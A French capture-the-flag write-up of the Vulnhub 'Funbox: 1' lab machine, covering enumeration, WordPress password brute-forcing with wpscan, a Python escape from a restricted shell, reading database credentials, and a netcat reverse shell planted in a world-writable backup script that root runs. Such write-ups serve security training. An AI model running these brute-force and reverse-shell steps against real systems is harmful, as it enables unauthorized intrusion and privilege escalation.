---
layout: default
title: "Writeup Funbox: 1 - Vulnhub"
date:   2020-08-08 03:00:00 +0200
published: true
categories:
  - Writeup
---

# Informations sur la box :

* **Difficulté** : Facile
* **Description** : *Boot2Root ! This is a real life scenario, but easy going. You have to enumerate and understand the scenario to get the root-flag in round about 20min.*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/funbox-1,518/](https://www.vulnhub.com/entry/funbox-1,518/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique (restricted)](#shell-basique)
*	[Privilege escalation jusqu'au root](#privilege-escalation)

* * *

## Énumération
* * *

On ne perd pas nos vieilles habitudes et on commence avec ``nmap`` pour découvrir l'adresse IP de la machine à attaquer :

```bash
nmap -sP 192.168.1.0/24
```

On obtient l'IP : **192.168.1.49**

On continue avec ``nmap`` pour scanner les ports et trouver ceux qui sont ouverts avec les services qui tournent dessus :

```bash
nmap -sV -p- 192.168.1.49 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

On obtient les informations suivantes :

```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequest, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message
|_    HY000
```

On retrouve les ports habituels : **FTP**, **SSH**, **HTTP**. Le serveur MySQL a été changé par rapport à son numéro de port initial qui est censé être **3306**

J'ai l'habitude de commencer par essayer de me connecter au **SSH** pour voir si jamais une **bannière** est présente :

```bash
ssh root@192.168.1.49
```

Ici rien pour nous donner plus d'informations.

Pour changer on peut commencer par le port 21 qui est **FTP**. On tente de s'y connecter en **anonymous** pour avoir de plus amples informations sur le contenu du système. Pour se faire il faut préciser en login **anonymous** et un mot de passe **vide** :

```bash
ftp 192.168.1.49
```

Dans notre cas la connexion anonymous n'est pas permise. Peut-être qu'on aura l'occasion d'utiliser FTP plus tard.

On se rend sur le site web **port 80** via le navigateur à l'adresse suivante : http://192.168.1.49                                                                                                  
Cependant on n'arrive pas à y accéder puisqu'il faut ajouter dans notre fichier **host** :

```bash
echo '192.168.1.49      funbox.fritz.box' >> /etc/hosts
```

Une fois sur la page d'accueil on se reconnaît directement le thème de **WordPress**.                                                                                                                
Le site n'a pas beaucoup d'informations intéressantes. Je décide donc de lancer **ffuf** pour repérer les potentiels fichiers et répertoires "cachés" :

```bash
ffuf -u http://192.168.1.49/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .html,.php,.txt
```

On recherche également de potentiels fichiers qui auraient pour extension **.php, .txt et .html**.

```bash
wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 61294, Words: 3825, Lines: 497]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385]
wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]
wp-login.php            [Status: 200, Size: 4502, Words: 211, Lines: 83]
readme.html             [Status: 200, Size: 7278, Words: 740, Lines: 98]
robots.txt              [Status: 200, Size: 19, Words: 2, Lines: 2]
secret                  [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
```

Sans surprises on retrouve les dossiers et fichiers liés à WordPress ainsi qu'un autre dossier qui peut être intéressant : **secret**.

Lorsqu'on va voir dans le **robots.txt** on retrouve ce fameux dossier secret. On tente donc d'y accéder à l'adresse suivante : http://funbox.fritz.box/secret/ un joli message nous accueille ``No secrets here. Try harder !``. On aurait préféré des informations croustillantes mais on va se contenter de cet encouragement.                                     


J'ai ensuite tenté de scanner le site web avec l'outil **wpscan** puisque c'est du WordPress :

```bash
wpscan --url http://funbox.fritz.box/ -e
```

L'option `-e` veut dire qu'on veut tout **énumérer** (plugins, utilisateurs, thèmes ...).

Enfin quelque chose d'intéressant !

```bash
[+] admin
[+] joe
```

Nous avons obtenus deux **utilisateurs**. On peut continuer sur cette lancée avec wpscan et tenter de **bruteforce** ces deux noms d'utilisateurs :

```bash
wpscan --url http://funbox.fritz.box/ -U 'admin,joe' -P /usr/share/wordlist/rockyou.txt
```

On spécifie avec `-U` la liste des utilisateurs (on aurait également pu les mettre dans un fichier).
`-P` permet de spécifier la wordlist pour tenter de cracker les mots de passes. On reste sur du basique avec **rockyou**.

Peu de temps après on ressort avec deux mots de passe (faut se réjouir ça n'arrive pas souvent) :

```bash
Username: joe, Password: 12345
Username: admin, Password: iubire
```

On se connecte avec *admin* sur http://funbox.fritz.box/wp-login.php mais il n'y a rien de vraiment intéressant sur le dashboard si ce n'est un message du créateur de la box qui nous donne plus de précisions sur celle-ci.


La paire ``joe:12345`` permet de se connecter au **SSH** et au **FTP**. Quitte à être plus à l'aise avec un shell autant se diriger vers le SSH :

```bash
ssh joe@192.168.1.49
```

On arrive donc dans le *home* de joe. On apperçoit plusieurs fichiers intéressants. On commence par le mail :

```bash
From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
    id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131238.2D257446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root <root@funbox>

Hi Joe, please tell funny the backupscript is done.

From root@funbox  Fri Jun 19 13:15:21 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
    id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131521.8E2D4446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root <root@funbox>

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.
```

Ici on apprend qu'il y a un autre utilisateur nommé **funny**, qu'un script de **backup** est prêt et que joe doit changer son mot de passe parce que 12345 c'est pas terrible (et c'est vrai !).
La dernière info est peu pertinente puisqu'on connait déjà son mot de passe.

On a la possibilité de voir le contenu du ``.bash_history`` qui nous donne beaucoup (trop ?) d'informations sur les fichiers à aller voir de plus près.                                              
Personnellement je pense que c'est un oublie du créateur de la box parce que la plupart du temps ce fichier est redirigé vers ``/dev/null`` pour ne garder aucun historique (et donc moins nous facilité la tâche).

Jusqu'ici tout allait bien ... Quelle ne fût pas ma surprise lorsque je vis ce doux message en essayant de remonter dans larborescence avec la commande ``cd`` :

```bash
-rbash: cd: restricted
```

Après avoir affiché le fichier ``/etc/passwd`` on se rend compte effectivement que nous sommes dans un shell restreint :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
funny:x:1000:1000:funny:/home/funny:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
joe:x:1001:1001:joe miller,,,:/home/joe:/bin/rbash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
proftpd:x:114:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:115:65534::/srv/ftp:/usr/sbin/nologin
```

Plusieurs choix s'offrent à nous :

* Soit on tente de **s'échapper** de ce restricted shell
* Soit on utilise FTP pour se promener sur le système sans avoir de restrictions sur les commandes

Pour la suite ça ne change pas grand chose mais je vais quand même montrer les deux méthodes.

Pour s'échapper d'un **restricted bash** il y a plusieurs possibilités que vous pouvez retrouver **[ici](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)**.        
Personnellement j'ai choisi d'utiliser **Python** :

```bash
python -c 'import os; os.system("/bin/bash")'
```

Nous voilà sortis de cette *prison*, on peut désormais vadrouiller comme bon nous semble.

Pour la partie sur FTP il n'y a pas de manipulation particulière. Il suffit de se connecter sur le port 21 puis de naviguer jusqu'à trouver ce qui nous intéresse :

```bash
ftp 192.168.1.49 -> joe:12345
```

On se rend dans le répertoire de **funny** (*/home/funny/*) et on trouve des fichiers intéressants. Comme nous sommes en FTP on ne peut pas les lire directement. C'est pour cela qu'on va utiliser la commande **get**.                                                                                                                                                                              
Dans le cas où nous sommes en SSH ça ne pose pas de problèmes.

Nous allons donc récupérer tous les fichiers intéressants et on les analysera ensuite un par un :

* /home/funny/html.tar
* /home/funny/.backup.sh
* /home/funny/.reminder.sh

D'autres fichiers m'ont également tapé dans l'oeil :

* /var/mail/joe
* /var/www/html/wp-config.php

Commençons par regarder ce que contient le **mail** de joe :

```bash
cat /var/mail/joe

From funny@funbox  Fri Jun 19 14:31:26 2020
Return-Path: <funny@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 1000)
    id A7979446B3; Fri, 19 Jun 2020 14:31:26 +0000 (UTC)
Subject: Reminder
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619143126.A7979446B3@funbox.fritz.box>
Date: Fri, 19 Jun 2020 14:31:26 +0000 (UTC)
From: funny <funny@funbox>

Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.
```

On connait déjà l'existence de ce fameux script de backup mais on apprend qu'il sauvegarde l'entièreté de l'espace du site web.                                                                    
On obtient également un nouveau nom **ted** qui pourrait être un utilisateur qui nous servira plus tard (même s'il ne figure pas dans le fichier ``/etc/passwd``).

Continuons avec le fichier de **configuration WordPress** :

```bash
/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'wordpress');
```

Ces deux lignes retiennent mon attention. Nous avons désormais accès à la base de données du site qui est sous WordPress. Normalement pas de surprises ici puisque nous avons déjà récolté les mots de passe des deux utilisateurs du site à l'aide de **wpscan**. Mais pour être vraiment sûr on peut quand même aller y faire un tour :

```bash
mysql -u wordpress -p -> wordpress

show databases;
use databases
show tables;
select * from wp_users;

+----+------------+------------------------------------+
| ID | user_login | user_pass                          |
+----+------------+------------------------------------+
|  1 | admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 |
|  2 | joe        | $P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 |
+----+------------+------------------------------------+
```

On retrouve nos deux noms d'utilisateurs. On peut s'amuser à retrouver les mots de passe à partir des hashs mais ça n'a pas vraiment d'intérêts puisqu'on les connait déjà.                               

Si *vraiment* vous voulez vous amuser, vous pouvez le faire avec **hashcat**. Il suffit d'ajouter les deux hashs dans un fichier que l'on nommera par exemple ``hashes.txt`` (**Attention** un hash par ligne) puis d'utiliser cette commande :

```bash
hashcat -m 400 --force hashes.txt /usr/share/wordlist/rockyou.txt
```

On repart sur les fichiers qui étaient dans ``/home/funny``.                                                                                                                                      
Concernant .reminder.sh voici ce qu'il contient :

```bash
#!/bin/bash
echo "Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run." | mail -s"Reminder" joe@funbox
```

Il s'agit du script qui a envoyé le mail qu'on a vu précédemment (``/var/mail/joe``). Donc il ne nous donne pas vraiment plus d'informations.

L'archive **tar** ne contient rien d'utile. C'est une simple sauvegarde du site web sans données supplémentaires.

On arrive sur le dernier fichier (*le meilleur pour la fin*) qui est ``/home/funny/.backup.sh``. Son contenu est le suivant :

```bash
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
```

C'est le fameux script qui fait la sauvegarde de ``/var/www/html``. Heureusment pour nous, ce fichier dispose de tous les droits dessus (``chmod 777``). On peut donc le modifier pour y intégrer un reverse shell qui pourra être exécuté par la suite pour devenir **funny**.

Il ne nous reste plus qu'à savoir **comment** ?

Un coup de **linepeas** nous indique ceci :

```bash
[+] Modified interesting files in the last 5mins (limit 100)
/home/funny/html.tar
```

Avec ceci on sait désormais que le script (``/home/funny/.backup.sh``) se lance régulièrement. Cependant il n'y a aucun cron job qui est lié à ceci.                                                
Quand nous sommes dans ce cas il suffit de sortir **pspy64** pour voir en temps réel les processus qui tournent sur la machine.

Bizarrement on retrouve ceci :

```bash
2020/08/07 16:32:12 CMD: UID=0    PID=35753  | /bin/bash /home/funny/.backup.sh 
2020/08/07 16:32:12 CMD: UID=1000 PID=35752  | /bin/bash /home/funny/.backup.sh 
```

Ce qui veut dire que **root** et **funny** lancent eux deux le script? Etrange ...

On va quand même tenter d'obtenir un shell via l'un des deux. Dans ``/home/funny/.backup.sh`` :

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.1.16 4444 >/tmp/f
```

Côté attaquant on lance un listener avec **nc** :

```bash
nc -lnvp 4444
```

Après quelques instants nous sommes **root** !

On peut donc aller récupérer le flag (et l'unique) :

```bash
cat /root/flag.txt

Great ! You did it...
FUNBOX - made by @0815R2d2
```

Etant curieux, je me suis déconnecté pour voir si j'arrivais à me connecter en tant que **funny** et effectivement ça arrive une fois sur deux.

Est-ce donc volontaire ou bien est-ce une erreur de configuration ?


Dans tous les cas nous avons atteint l'objectif du root. Si vous avez des précisions à apporté sur ce soit disant problème ou si vous avez des questions, n'hésitez pas à m'en faire part directement sur **[Twitter](https://twitter.com/ZworKrowZ)** ou en rejoignant mon serveur **[Discord](https://discord.gg/v6rhJay)**


Merci à [@0815R2d2](https://twitter.com/0815R2d2) pour cette box !